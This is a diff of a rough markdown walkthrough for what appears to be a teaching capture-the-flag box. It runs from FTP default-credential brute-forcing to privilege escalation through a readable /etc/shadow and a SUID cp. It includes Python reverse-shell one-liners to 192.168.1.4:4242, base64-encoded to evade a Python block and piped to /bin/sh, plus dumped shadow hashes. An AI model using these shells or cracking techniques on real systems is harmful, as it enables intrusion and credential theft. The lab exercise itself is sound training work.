@@ -10,14 +10,14 @@ flask_1  |     1 | #include <stdio.h>
 flask_1  |       |          ^~~~~~~~~
 ```
 
+(See how this bites later)
+
 ## Initial Recon
 
-```
-dang@dang-laptop ~/Github/Teaching/BuildEvent/Writeups/Ben$ docker ps                      ✭Smoos 
-CONTAINER ID   IMAGE                    COMMAND                  CREATED          STATUS         PORTS                                                            NAMES
-bf7965fe0df0   docker_ftpd              "/init"                  11 seconds ago   Up 5 seconds   0.0.0.0:20-21->20-21/tcp, 0.0.0.0:65500-65515->65500-65515/tcp   docker_ftpd_1
-4829678f439b   docker_flask             "./home/intern/runap…"   11 seconds ago   Up 9 seconds   0.0.0.0:5000->5000/tcp                                           docker_flask_1
-```
+Nmap
+ 
+  - FTP 
+  - HTTP (5000)
 
 
 ```
@@ -54,8 +54,7 @@ Tells me to go to the notes page...
 
  - Unknown user we get "user does not exist"
  - Known user we get "invalid password"
- - Not sure that SQLi works though
-
+ - We dont have SQLi,  but meh at least we know we can enum users
 
 ## FTP
 
@@ -101,7 +100,16 @@ Regards,
 
 ## Back to FTP 
 
+Ok, so trying some standard password with HTTP fails, 
+Lets go back to FTP and see if there are permissions at play here
+
+First Bruteforce (based on clue about lists of creds) using this. 
+
 https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
+
+
+
+
 
 ['ftp', 'b1uRR3']
 Login Successful
@@ -170,4 +178,138 @@ sudo -u intern python3 /home/intern/main.py
 ```
 
 
-Appears that the runme script isnt in manager...
+## Try to get a better shell
+
+export RHOST="192.168.1.4";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+Python is blocked so base 64
+
+
+python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((162.168.1.4,4242)));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+ZXhwb3J0IFJIT1NUPSIxOTIuMTY4LjEuNCI7ZXhwb3J0IFJQT1JUPTQyNDI7cHl0aG9uIC1jICdpbXBvcnQgc3lzLHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KChvcy5nZXRlbnYoIlJIT1NUIiksaW50KG9zLmdldGVudigiUlBPUlQiKSkpKTtbb3MuZHVwMihzLmZpbGVubygpLGZkKSBmb3IgZmQgaW4gKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL3NoIiknCg==
+
+
+```
+echo "cHl0aG9uIC1jICdpbXBvcnQgc3lzLHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC4xLjQiLDQyNDIpKTtbb3MuZHVwMihzLmZpbGVubygpLGZkKSBmb3IgZmQgaW4gKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL3NoIiknCgo=" | base64 -d | /bin/sh
+```
+
+So that's a bit of a fucker,  why isnt that working...  Python version and damn Debian...
+
+As python is blocked..  
+
+Whic python (d2hpY2ggcHl0aG9u) gives me nothing
+
+Python3 does exist
+
+
+cHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoIjE5Mi4xNjguMS40Iiw0MjQyKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9zaCIpJwoK
+
+
+echo "cHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoIjE5Mi4xNjguMS40Iiw0MjQyKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9zaCIpJwoK" | base64 -d | /bin/sh
+
+And it hangs which is a great sign...
+
+
+## Manager....
+
+intern@4829678f439b:/home/manager$ echo "/bin/bash" > /tmp/cat
+intern@4829678f439b:/home/manager$ chmod +x /tmp/cat
+chmod +x /tmp/cat
+
+However I dont have the correct permissions to SUID that.
+A bit fo recon later...  /etc/shdow it readable
+
+```
+['', '6', 'oFWC0rkHygWWmjgZ', 'enKFVOevGqCTl3bOosoDvwIzPyQ3adjALa2PHzNs4YsmeTMi8Id9nnYueildKRjirxFvU0Ub7Ko2jzVSgPUPJ/']
+$6$oFWC0rkHygWWmjgZ
+Found s3cret_passw0rd
+
+```
+
+Then 
+
+```
+su manager...
+manager@4829678f439b:~$ id
+id
+uid=222(manager) gid=222(manager) groups=222(manager),1000(rootish)
+```
+
+Ok so now we have 
+
+```
+manager@4829678f439b:~$ ls -l /usr/bin/cp
+ls -l /usr/bin/cp
+-rwsr-xr-x 1 manager root 153976 Sep  5  2019 /usr/bin/cp
+```
+
+
+Which still isnt much use.  However id gives us rootish group
+
+```
+manager@4829678f439b:~$ find / -group rootish 2>/dev/null
+find / -group rootish 2>/dev/null
+/etc/shadow
+```
+
+```
+ls -l /etc/shadow
+-rw-r--r-- 1 root rootish 859 Apr  3 20:54 /etc/shadow
+```
+
+While i cant write directly,  perhaps I can copy 
+
+```
+root:$6$Mho/yWVF4uag7ASh$Zpc.ryZVLWxiL81V.ykROK2RgtoWq3v58NqhCLHXAC1Pq7E8.i9dFU6/uO.9ySG/zjceCxhTzhIpb43BRVJBm.:18720:0:99999:7:::
+daemon:*:18718:0:99999:7:::
+bin:*:18718:0:99999:7:::
+sys:*:18718:0:99999:7:::
+sync:*:18718:0:99999:7:::
+games:*:18718:0:99999:7:::
+man:*:18718:0:99999:7:::
+lp:*:18718:0:99999:7:::
+mail:*:18718:0:99999:7:::
+news:*:18718:0:99999:7:::
+uucp:*:18718:0:99999:7:::
+proxy:*:18718:0:99999:7:::
+www-data:*:18718:0:99999:7:::
+backup:*:18718:0:99999:7:::
+list:*:18718:0:99999:7:::
+irc:*:18718:0:99999:7:::
+gnats:*:18718:0:99999:7:::
+nobody:*:18718:0:99999:7:::
+_apt:*:18718:0:99999:7:::
+intern:$6$7bGJuDAJYbtjddHs$orq2RKCGNDPvIzwCkcE3aEX7TA7LDrS2ToYYcAm7Bc4UP0VhrptKLptRhwPsojkOxqF8DV3BWmPN39or8n0Ox0:18720::::::
+manager:$6$oFWC0rkHygWWmjgZ$enKFVOevGqCTl3bOosoDvwIzPyQ3adjALa2PHzNs4YsmeTMi8Id9nnYueildKRjirxFvU0Ub7Ko2jzVSgPUPJ/:18720::::::
+```
+
+Replace root with manager and 
+
+```
+cat '<big string' > newShadow
+```
+
+Nope
+
+
+## Turns out we didnt have correct perms on the SUID
+
+Modify runme.sh
+
+```
+chown root:manager /home/manager/runme
+```
+
+And now we should be good to go..
+
+
+
+
+## Other Things
+
+Create DB Script
+
+```
+Result:from main import db, uuid, User, Notes def addUsers(users): for x in users: db.session.add(x) db.session.commit() def addNotes(notes): for x in notes: db.session.add(x) db.session.commit() if __name__ == "__main__": print("@>Initializing Database for webapp") db.create_all() print("@>Creating Users") admin_uuid=str(uuid.uuid4()) noah_uuid=str(uuid.uuid4()) users = [ #User(username='admin', email='admin@sharklabs.local', uuid=admin_uuid, admin_cap=True, password="0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68"), User(username="intern", email="intern@canely.com", uuid=admin_uuid, admin_cap=True, password="1a5216617482939c6e719d62e66fd6cdf2392a9a1a32c3cb132ae3b702c471ff")] # my_wifes_birthday print("@>Adding Users") addUsers(users) print("@>DONE. Database initialized and populated.") 
+```
